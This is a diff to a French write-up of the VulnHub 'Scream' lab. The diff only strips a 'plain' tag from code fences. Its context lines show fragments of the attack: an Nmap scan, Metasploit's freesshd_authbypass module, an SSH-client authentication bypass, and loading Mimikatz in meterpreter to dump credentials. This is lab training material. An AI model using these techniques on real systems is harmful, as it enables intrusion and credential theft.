@@ -16,7 +16,7 @@ Ici l'objectif [du challenge Scream](http://vulnhub.com/entry/devrandom_scream,4
 
 *Nmap* révèle la présence de différents services :  
 
-```plain
+```
 Nmap scan report for 192.168.1.22
 Host is up (0.00029s latency).
 Not shown: 996 filtered ports
@@ -63,7 +63,7 @@ L'exploit consiste à récupérer et modifier un client SSH ([5.8p2](https://lau
 
 Je me suis bêtement rendu compte en fouillant un peu plus que *Metasploit* disposait aussi d'un exploit pour la même vulnérabilité :  
 
-```plain
+```
 msf exploit(freesshd_authbypass) > show options
 
 Module options (exploit/windows/ssh/freesshd_authbypass):
@@ -159,7 +159,7 @@ A tout hazard on lance *John The Ripper* mais après quelques minutes on se dit 
 
 Finalement je tombe [sur cet article](http://www.securityartwork.es/2013/06/04/mimikatz-extension-for-metasploit/?lang=en) qui parle du module *Mimikatz* dans *Metasploit*. Mettons en application :  
 
-```plain
+```
 meterpreter > load mimikatz
 Loading extension mimikatz...success.
 
